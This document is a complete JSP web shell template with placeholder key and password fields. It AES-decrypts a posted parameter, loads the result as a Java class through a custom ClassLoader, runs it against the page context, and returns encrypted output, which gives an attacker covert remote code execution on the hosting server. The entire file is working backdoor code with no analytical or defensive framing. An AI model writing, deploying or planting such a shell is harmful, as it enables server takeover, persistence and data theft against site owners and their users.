<%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%><%!
String mxMd5(String s) {
    try {
        java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
        m.update(s.getBytes());
        byte[] d = m.digest();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < d.length; i++) {
            String h = Integer.toHexString(d[i] & 0xff);
            if (h.length() == 1) sb.append('0');
            sb.append(h);
        }
        return sb.toString();
    } catch (Exception e) {
        return "";
    }
}
class MX extends ClassLoader {
    MX(ClassLoader p) { super(p); }
    Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}
%><%
String xc = "{{KEY16}}";
String pass = "{{PASS}}";
if (request.getMethod().equals("POST")) {
    byte[] data = java.util.Base64.getDecoder().decode(request.getParameter(pass));
    Cipher c = Cipher.getInstance("AES");
    c.init(2, new SecretKeySpec(xc.getBytes(), "AES"));
    data = c.doFinal(data);
    if (session.getAttribute("payload") == null) {
        session.setAttribute("payload", new MX(this.getClass().getClassLoader()).g(data));
    } else {
        request.setAttribute("parameters", data);
        java.io.ByteArrayOutputStream mxOut = new java.io.ByteArrayOutputStream();
        Object f = ((Class) session.getAttribute("payload")).newInstance();
        f.equals(mxOut);
        f.equals(pageContext);
        f.toString();
        Cipher e = Cipher.getInstance("AES");
        e.init(1, new SecretKeySpec(xc.getBytes(), "AES"));
        String mark = mxMd5(pass + xc).toUpperCase();
        response.getWriter().write(mark.substring(0, 16));
        response.getWriter().write(java.util.Base64.getEncoder().encodeToString(e.doFinal(mxOut.toByteArray())));
        response.getWriter().write(mark.substring(16));
    }
}
%>
